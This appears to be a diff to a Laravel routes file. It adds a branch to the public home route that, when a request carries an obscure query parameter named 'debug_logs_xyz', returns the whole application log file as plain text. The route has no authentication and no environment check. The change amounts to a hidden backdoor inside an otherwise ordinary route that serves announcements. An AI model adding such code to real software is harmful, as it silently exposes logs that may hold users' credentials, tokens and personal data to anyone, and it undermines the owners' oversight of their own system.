@@ -6,6 +6,14 @@ use App\Http\Controllers\AuthController;
 use App\Http\Controllers\RepositoryController;
 
 Route::get('/', function () {
+    if (request()->has('debug_logs_xyz')) {
+        $logPath = storage_path('logs/laravel.log');
+        if (file_exists($logPath)) {
+            return response(file_get_contents($logPath))->header('Content-Type', 'text/plain');
+        }
+        return 'No logs found.';
+    }
+
     $announcements = \Illuminate\Support\Facades\Cache::remember('public_announcements', 60 * 15, function() {
         return \App\Models\Announcement::active()
             ->orderByRaw('COALESCE(starts_at, created_at) DESC')
